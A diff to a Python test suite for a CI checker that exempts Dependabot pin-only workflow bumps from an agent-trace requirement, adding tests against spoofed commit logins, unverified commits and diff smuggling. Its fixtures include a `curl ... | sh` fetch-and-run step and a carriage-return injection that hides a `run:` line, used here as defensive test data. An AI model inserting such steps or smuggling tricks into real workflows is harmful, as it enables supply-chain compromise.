@@ -8,8 +8,11 @@ files so the test exercises the exact CLI contract the Agent Behavior workflow
 uses, not internals that could drift from it.
 
 Threat model covered by most of the "fails" cases below: a write-access insider
-pushing extra commits/diffs onto an otherwise-legitimate Dependabot branch/PR,
-not just an untrusted external contributor.
+pushing extra commits/diffs onto an otherwise-legitimate Dependabot branch/PR --
+including one who can make `.author.login`/`.committer.login` say "dependabot[bot]"
+/"web-flow" by spoofing git author/committer email, since those fields are just
+email-to-account matching, not cryptographic proof. GitHub's own
+`commit.verification.{verified,reason}` is the part that can't be spoofed that way.
 """
 import json
 import shutil
@@ -24,8 +27,18 @@ SCRIPT = REPO_ROOT / "scripts" / "ci" / "check-agent-trace-requirement.py"
 POLICY = REPO_ROOT / ".agents" / "evals" / "risk-policy.json"
 STANDING_TRACE = REPO_ROOT / ".agents" / "evals" / "traces" / "dependency-bump.json"
 
-DEPENDABOT_COMMITS = "dependabot[bot] dependabot[bot]\n"
-MIXED_COMMITS = "dependabot[bot] dependabot[bot]\nsome-insider some-insider\n"
+
+def commit_record(sha="d4fbb17d00000000000000000000000000000000", author_login="dependabot[bot]",
+                   committer_login="web-flow", verified=True, reason="valid"):
+    return json.dumps({
+        "sha": sha, "author_login": author_login, "committer_login": committer_login,
+        "verified": verified, "reason": reason,
+    })
+
+
+# Shaped like the real `gh api repos/dasomel/narwhal/pulls/210/commits` response for PR #210's
+# single ruby/setup-ruby bump commit: author dependabot[bot], committer web-flow, GitHub-verified.
+REALISTIC_DEPENDABOT_COMMITS = commit_record() + "\n"
 
 UPGRADE_DIFF = """diff --git a/.github/workflows/lint.yml b/.github/workflows/lint.yml
 index 1111111..2222222 100644
@@ -50,10 +63,10 @@ index 1111111..2222222 100644
 +      - run: curl https://example.com/install.sh | sh
 """
 
-# A `\r` embedded mid-line: str.splitlines() (the original bug) would have split this
-# into two lines, one of which looks like a clean `uses:` pin and hides the `run:` step
-# from a per-line scanner. split("\n") sees it as a single non-matching line either way,
-# and the explicit forbidden-char scan catches it regardless.
+# A `\r` embedded mid-line: reading via a newline-translating API would silently split this
+# into two lines, one of which looks like a clean `uses:` pin and hides the `run:` step from
+# a per-line scanner. The checker reads raw bytes (no translation) so it sees one line
+# containing a literal \r and rejects it outright.
 CR_INJECTION_DIFF = (
     "diff --git a/.github/workflows/lint.yml b/.github/workflows/lint.yml\n"
     "index 1111111..2222222 100644\n"
@@ -112,6 +125,21 @@ index 1111111..2222222 100644
 +      - uses: ruby/setup-ruby@v1.324.0
 """
 
+# Same owner/repo/SHA change as UPGRADE_DIFF, but the added line's indentation (list-marker
+# prefix) differs from the removed line's -- e.g. a step got reformatted/reflowed along with
+# the bump. Pairing must key on prefix too, not just owner/repo, or a step could be moved to a
+# different position/nesting while "reusing" an unrelated bump to look pin-only.
+INDENTATION_CHANGE_DIFF = """diff --git a/.github/workflows/lint.yml b/.github/workflows/lint.yml
+index 1111111..2222222 100644
+--- a/.github/workflows/lint.yml
++++ b/.github/workflows/lint.yml
+@@ -10,7 +10,7 @@ jobs:
+     runs-on: ubuntu-latest
+     steps:
+-      - uses: ruby/setup-ruby@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v1.321.0
++  uses: ruby/setup-ruby@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb # v1.324.0
+"""
+
 
 class RunResult(unittest.TestCase):
     def setUp(self):
@@ -124,7 +152,7 @@ class RunResult(unittest.TestCase):
         shutil.copy(POLICY, self.tmp / ".agents" / "evals" / "risk-policy.json")
         shutil.copy(STANDING_TRACE, self.tmp / ".agents" / "evals" / "traces" / "dependency-bump.json")
 
-    def run_checker(self, changed_files, pr_author=None, workflow_diff=None, commit_authors=None):
+    def run_checker(self, changed_files, pr_author=None, workflow_diff=None, commits=None, expected_commit_count=None):
         changed_path = self.tmp / "changed.txt"
         changed_path.write_text("\n".join(changed_files) + "\n")
         cmd = [
@@ -138,10 +166,12 @@ class RunResult(unittest.TestCase):
             diff_path = self.tmp / "workflow.diff"
             diff_path.write_bytes(workflow_diff.encode("utf-8"))
             cmd += ["--workflow-diff", str(diff_path)]
-        if commit_authors is not None:
-            commits_path = self.tmp / "commit-authors.txt"
-            commits_path.write_text(commit_authors)
-            cmd += ["--commit-authors", str(commits_path)]
+        if commits is not None:
+            commits_path = self.tmp / "commits.jsonl"
+            commits_path.write_text(commits)
+            cmd += ["--commits", str(commits_path)]
+        if expected_commit_count is not None:
+            cmd += ["--expected-commit-count", str(expected_commit_count)]
         proc = subprocess.run(cmd, cwd=self.tmp, capture_output=True, text=True)
         try:
             report = json.loads(proc.stdout)
@@ -149,25 +179,31 @@ class RunResult(unittest.TestCase):
             report = None
         return proc.returncode, report, proc.stderr
 
-    def assert_exempt(self, changed, workflow_diff=UPGRADE_DIFF, commit_authors=DEPENDABOT_COMMITS):
+    def assert_exempt(self, changed, workflow_diff=UPGRADE_DIFF, commits=REALISTIC_DEPENDABOT_COMMITS, expected_commit_count=1):
         rc, report, stderr = self.run_checker(
-            changed, pr_author="dependabot[bot]", workflow_diff=workflow_diff, commit_authors=commit_authors,
+            changed, pr_author="dependabot[bot]", workflow_diff=workflow_diff,
+            commits=commits, expected_commit_count=expected_commit_count,
         )
         self.assertEqual(rc, 0, f"expected exempt/pass, got rc={rc} stderr={stderr} report={report}")
         self.assertTrue(report["traceExempt"], report)
         return report
 
-    def assert_not_exempt(self, changed, workflow_diff=UPGRADE_DIFF, commit_authors=DEPENDABOT_COMMITS, pr_author="dependabot[bot]"):
+    def assert_not_exempt(self, changed, workflow_diff=UPGRADE_DIFF, commits=REALISTIC_DEPENDABOT_COMMITS,
+                           expected_commit_count=1, pr_author="dependabot[bot]"):
         rc, report, stderr = self.run_checker(
-            changed, pr_author=pr_author, workflow_diff=workflow_diff, commit_authors=commit_authors,
+            changed, pr_author=pr_author, workflow_diff=workflow_diff,
+            commits=commits, expected_commit_count=expected_commit_count,
         )
         self.assertEqual(rc, 1, f"expected a failure, got rc={rc} stderr={stderr} report={report}")
         self.assertFalse(report["traceExempt"], report)
         return report
 
-    # --- baseline behaviors (kept from the original PR) ---------------------------------
+    # --- baseline behaviors -----------------------------------------------------------
 
     def test_dependabot_uses_only_bump_passes(self):
+        # This is the realistic shape: author dependabot[bot], committer web-flow,
+        # GitHub-verified -- exactly what `gh api .../pulls/210/commits` returns for the
+        # real PR #210 this exemption exists to unblock.
         report = self.assert_exempt([".github/workflows/lint.yml"])
         self.assertTrue(report["traceRequired"])
         self.assertFalse(report["traceChanged"])
@@ -179,7 +215,7 @@ class RunResult(unittest.TestCase):
     def test_dependabot_bump_missing_workflow_diff_fails_closed(self):
         rc, report, stderr = self.run_checker(
             [".github/workflows/lint.yml"], pr_author="dependabot[bot]",
-            workflow_diff=None, commit_authors=DEPENDABOT_COMMITS,
+            workflow_diff=None, commits=REALISTIC_DEPENDABOT_COMMITS, expected_commit_count=1,
         )
         self.assertEqual(rc, 1)
         self.assertFalse(report["traceExempt"])
@@ -191,7 +227,8 @@ class RunResult(unittest.TestCase):
     def test_human_workflow_edit_without_trace_fails(self):
         report = self.assert_not_exempt(
             [".github/workflows/lint.yml"], workflow_diff=NON_PIN_DIFF, pr_author="a-human-contributor",
-            commit_authors="a-human-contributor a-human-contributor\n",
+            commits=commit_record(author_login="a-human-contributor", committer_login="a-human-contributor",
+                                   verified=False, reason="unsigned") + "\n",
         )
         self.assertNotIn("uses:", report.get("traceExemptionDetail") or "")  # rejected before ever reaching diff parsing
 
@@ -209,15 +246,13 @@ class RunResult(unittest.TestCase):
         self.assertEqual(rc, 0, stderr)
         self.assertFalse(report["traceRequired"])
 
-    # --- security-review follow-up: line-break / diff-shape smuggling ------------------
+    # --- diff-shape smuggling -----------------------------------------------------------
 
     def test_cr_injection_is_rejected(self):
         report = self.assert_not_exempt([".github/workflows/lint.yml"], workflow_diff=CR_INJECTION_DIFF)
         self.assertIn("line-break character", report["traceExemptionDetail"])
 
     def test_empty_diff_fails_closed(self):
-        # Workflow file is listed as changed, but the diff we hand the checker has no
-        # matching `diff --git` block for it at all (e.g. a broken/empty capture).
         report = self.assert_not_exempt([".github/workflows/lint.yml"], workflow_diff="")
         self.assertIn("no parseable diff hunk", report["traceExemptionDetail"])
 
@@ -245,23 +280,64 @@ class RunResult(unittest.TestCase):
         report = self.assert_not_exempt([".github/workflows/lint.yml"], workflow_diff=NON_SHA_DIFF)
         self.assertIn("not a 40-character commit SHA", report["traceExemptionDetail"])
 
-    # --- security-review follow-up: commit provenance (insider threat model) -----------
+    def test_indentation_change_is_rejected(self):
+        # Same owner/repo/SHA-change shape as the passing case, but the added line's
+        # indentation prefix differs -- pairing must key on prefix too, not owner/repo alone.
+        report = self.assert_not_exempt([".github/workflows/lint.yml"], workflow_diff=INDENTATION_CHANGE_DIFF)
+        self.assertIn("unpaired uses:", report["traceExemptionDetail"])
+        self.assertIn("identical indentation", report["traceExemptionDetail"])
 
-    def test_human_committed_commit_on_dependabot_pr_is_rejected(self):
-        # PR author metadata says dependabot[bot] and the diff is a clean pin bump, but one
-        # of the actual commits on the branch was authored/committed by someone else -- e.g.
-        # a write-access insider pushed an extra commit onto the Dependabot branch.
-        report = self.assert_not_exempt([".github/workflows/lint.yml"], commit_authors=MIXED_COMMITS)
-        self.assertIn("commit not authored and committed by a trusted login", report["traceExemptionDetail"])
+    # --- commit provenance (insider threat model) ---------------------------------------
 
-    def test_missing_commit_authors_fails_closed(self):
+    def test_realistic_webflow_verified_commit_passes(self):
+        # Exact shape of `gh api repos/dasomel/narwhal/pulls/210/commits`: author
+        # dependabot[bot], committer web-flow, verified=true, reason=valid.
+        self.assert_exempt([".github/workflows/lint.yml"], commits=REALISTIC_DEPENDABOT_COMMITS, expected_commit_count=1)
+
+    def test_unverified_commit_is_rejected(self):
+        report = self.assert_not_exempt(
+            [".github/workflows/lint.yml"],
+            commits=commit_record(verified=False, reason="unsigned") + "\n",
+        )
+        self.assertIn("not GitHub-verified", report["traceExemptionDetail"])
+
+    def test_spoofed_unsigned_dependabot_login_commit_is_rejected(self):
+        # An insider crafts a commit with author/committer email set to match
+        # dependabot[bot]/web-flow's known noreply addresses, so GitHub's email-to-account
+        # matching produces the same logins -- but the commit was never actually signed by
+        # GitHub, so verification fails. Login match alone must not be sufficient.
+        report = self.assert_not_exempt(
+            [".github/workflows/lint.yml"],
+            commits=commit_record(author_login="dependabot[bot]", committer_login="web-flow",
+                                   verified=False, reason="unsigned") + "\n",
+        )
+        self.assertIn("not GitHub-verified", report["traceExemptionDetail"])
+
+    def test_commit_count_mismatch_fails_closed(self):
+        # The pulls/commits API caps at 250 results even with --paginate; if the PR reports
+        # more commits than were actually fetched, some commits were never checked.
+        report = self.assert_not_exempt(
+            [".github/workflows/lint.yml"], commits=REALISTIC_DEPENDABOT_COMMITS, expected_commit_count=2,
+        )
+        self.assertIn("does not match the PR's reported commit count", report["traceExemptionDetail"])
+
+    def test_missing_commits_fails_closed(self):
         rc, report, stderr = self.run_checker(
             [".github/workflows/lint.yml"], pr_author="dependabot[bot]",
-            workflow_diff=UPGRADE_DIFF, commit_authors=None,
+            workflow_diff=UPGRADE_DIFF, commits=None, expected_commit_count=1,
         )
         self.assertEqual(rc, 1)
         self.assertFalse(report["traceExempt"])
-        self.assertIn("commit author list unavailable", report["traceExemptionDetail"])
+        self.assertIn("commit record list unavailable", report["traceExemptionDetail"])
+
+    def test_missing_expected_commit_count_fails_closed(self):
+        rc, report, stderr = self.run_checker(
+            [".github/workflows/lint.yml"], pr_author="dependabot[bot]",
+            workflow_diff=UPGRADE_DIFF, commits=REALISTIC_DEPENDABOT_COMMITS, expected_commit_count=None,
+        )
+        self.assertEqual(rc, 1)
+        self.assertFalse(report["traceExempt"])
+        self.assertIn("expected PR commit count not provided", report["traceExemptionDetail"])
 
 
 if __name__ == "__main__":
